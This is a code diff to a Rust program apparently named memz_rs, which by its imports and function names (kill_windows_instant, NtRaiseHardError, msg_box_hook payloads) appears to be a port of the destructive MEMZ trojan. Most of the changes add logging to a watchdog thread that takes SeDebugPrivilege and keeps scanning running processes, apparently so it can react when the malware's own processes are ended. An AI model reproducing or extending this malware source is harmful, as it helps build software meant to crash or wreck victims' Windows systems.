@@ -1,5 +1,8 @@
-#![allow(unused_imports)]
 #![allow(dead_code)]
+use ::log::error;
+#[cfg(feature = "DEBUG")]
+use ::log::info;
+
 use memz_rs::{
     convert_str::ToPCSTRWrapper,
     data::data::MSGS,
@@ -8,10 +11,11 @@ use memz_rs::{
         ntdll_api::{NtRaiseHardErrorFn, RtlAdjustPrivilegeFn},
     },
     payloads::payloads::msg_box_hook,
+    utils::log,
     wrap_windows_api::{
-        wrap_close_handle, wrap_create_toolhelp32_snapshot, wrap_get_current_thread_id,
-        wrap_get_process_image_filename_a, wrap_messagebox_a, wrap_process32_next,
-        wrap_set_privilege, wrap_set_windows_hook_ex_a, wrap_unhook_windows_hook_ex, Resolution,
+        set_privilege, wrap_close_handle, wrap_create_toolhelp32_snapshot,
+        wrap_get_current_thread_id, wrap_get_process_image_filename_a, wrap_messagebox_a,
+        wrap_process32_next, wrap_set_windows_hook_ex_a, wrap_unhook_windows_hook_ex, Resolution,
     },
     LMEM_ZEROINIT,
 };
@@ -24,9 +28,10 @@ use std::{
 use windows::Win32::{
     Foundation::{BOOL, HANDLE, HMODULE, HWND, INVALID_HANDLE_VALUE, NTSTATUS},
     Graphics::Gdi::HFONT,
+    Security::SE_DEBUG_NAME,
     System::{
         Diagnostics::ToolHelp::{Process32First, PROCESSENTRY32},
-        Threading::{OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_QUERY_LIMITED_INFORMATION},
+        Threading::{OpenProcess, PROCESS_QUERY_INFORMATION},
     },
     UI::WindowsAndMessaging::{MB_ICONHAND, MB_OK, MB_SYSTEMMODAL, WH_CBT},
 };
@@ -93,9 +98,12 @@ fn kill_windows_instant() -> Result<(), ()> {
 }
 
 fn main() {
+    log::new_log();
+
     let res = Resolution::new();
     let watchdog_thread = thread::spawn(watchdog_thread);
     watchdog_thread.join().unwrap().unwrap();
+
 }
 
 fn watchdog_thread() -> Result<(), ()> {
@@ -104,42 +112,49 @@ fn watchdog_thread() -> Result<(), ()> {
     wrap_get_process_image_filename_a(&mut f_buf1)?;
     #[cfg(feature = "DEBUG")]
     {
-        println!("f_buf1: {}", String::from_utf8_lossy(&f_buf1.as_slice()));
-        sleep(Duration::from_millis(1000));
+        let data = format!("f_buf1: {}", std::str::from_utf8(&f_buf1).unwrap());
+        let data = data.replace("\0", "");
+        println!("{}", data);
+        info!(target: "info_log", "{}", data);
+        sleep(Duration::from_millis(500));
     }
     sleep(Duration::from_millis(1000));
-    
-    dbg!(wrap_set_privilege("SeDebugPrivilege", true)?);
 
+    set_privilege(SE_DEBUG_NAME, true)?;
+
+    #[cfg(feature = "DEBUG")]
+    {
+        info!(target: "info_log", "{}", dbg!(set_privilege(SE_DEBUG_NAME, true)?))
+    }
     loop {
         let snapshot = wrap_create_toolhelp32_snapshot()?;
         #[cfg(feature = "DEBUG")]
         {
-            dbg!(&snapshot);
-            sleep(Duration::from_millis(1000));
+            info!(target: "info_log", "{:?}", dbg!(&snapshot));
+            sleep(Duration::from_millis(500));
         }
         let mut proc: PROCESSENTRY32 = PROCESSENTRY32 {
             dwSize: size_of::<PROCESSENTRY32>() as u32,
             ..Default::default()
         };
-        #[cfg(feature = "DEBUG")]
-        {
-            // dbg!(&proc);
-            sleep(Duration::from_millis(1000));
-        }
+
         unsafe {
             Process32First(snapshot, &mut proc);
             #[cfg(feature = "DEBUG")]
             {
-                println!(
+                let file = std::str::from_utf8(&proc.szExeFile).unwrap();
+                let file = file.replace("\0", "");
+
+                let th32_process_id = format!(
                     "Process32First() proc.th32ProcessID: {}",
                     proc.th32ProcessID
                 );
-                println!(
-                    "Process32First() proc.szExeFile: {}",
-                    String::from_utf8_lossy(&proc.szExeFile)
-                );
-                sleep(Duration::from_millis(1000));
+                let sz_exe_file = format!("Process32First() proc.szExeFile: {}", file);
+                println!("{}", th32_process_id);
+                println!("{}", sz_exe_file);
+                info!(target: "info_log", "{}", th32_process_id);
+                info!(target: "info_log", "{}", sz_exe_file);
+                sleep(Duration::from_millis(500));
             }
         }
 
@@ -155,7 +170,8 @@ fn watchdog_thread() -> Result<(), ()> {
                     ) {
                         Ok(handle) => Some(handle),
                         Err(e) => {
-                            dbg!(&e);
+                            let data = "OpenProcessError: The target process is running with administrator privileges or is a protected process.";
+                            error!(target: "err_log", "{}\n{}\n", data, dbg!(&e));
                             None
                         }
                     };
@@ -163,22 +179,25 @@ fn watchdog_thread() -> Result<(), ()> {
             }
             #[cfg(feature = "DEBUG")]
             {
-                dbg!(&h_proc);
-                sleep(Duration::from_millis(1000));
+                info!(target: "info_log", "{:?}\n", dbg!(&h_proc));
+                sleep(Duration::from_millis(500));
             }
             let mut f_buf2: Vec<u8> = vec![LMEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
             wrap_get_process_image_filename_a(&mut f_buf2)?;
             #[cfg(feature = "DEBUG")]
             {
-                println!("f_buf2: {}", String::from_utf8_lossy(&f_buf2.as_slice()));
-                sleep(Duration::from_millis(1000));
+                let data = format!("f_buf2: {}", std::str::from_utf8(&f_buf2).unwrap());
+                let data = data.replace("\0", "");
+                println!("{}", data);
+                info!(target: "info_log", "{}\n", data);
+                sleep(Duration::from_millis(500));
             }
             if f_buf1 != f_buf2 {
                 nproc += 1;
                 #[cfg(feature = "DEBUG")]
                 {
-                    dbg!(&nproc);
-                    sleep(Duration::from_millis(1000));
+                    info!(target: "info_log", "{}\n", dbg!(&nproc));
+                    sleep(Duration::from_millis(500));
                 }
             }
 
@@ -195,17 +214,22 @@ fn watchdog_thread() -> Result<(), ()> {
             }
 
             if proc.th32ProcessID == 0 {
+                error!(target: "err_log", "Unable to open system process");
                 panic!("Unable to open system process");
             }
 
             #[cfg(feature = "DEBUG")]
             {
-                println!("Process32Next() proc.th32ProcessID {}", proc.th32ProcessID);
-                println!(
-                    "Process32Next() proc.szExeFile: {}",
-                    String::from_utf8_lossy(&proc.szExeFile)
-                );
-                sleep(Duration::from_millis(1000));
+                let file = std::str::from_utf8(&proc.szExeFile).unwrap();
+                let file = file.replace("\0", "");
+                let th32_process_id =
+                    format!("Process32Next() proc.th32ProcessID {}", proc.th32ProcessID);
+                let sz_exe_file = format!("Process32Next() proc.szExeFile: {}", file);
+                println!("{}", th32_process_id);
+                println!("{}", sz_exe_file);
+                info!(target: "info_log", "{}\n", th32_process_id);
+                info!(target: "info_log", "{}\n", sz_exe_file);
+                sleep(Duration::from_millis(500));
             }
         }
         wrap_close_handle(snapshot)?;
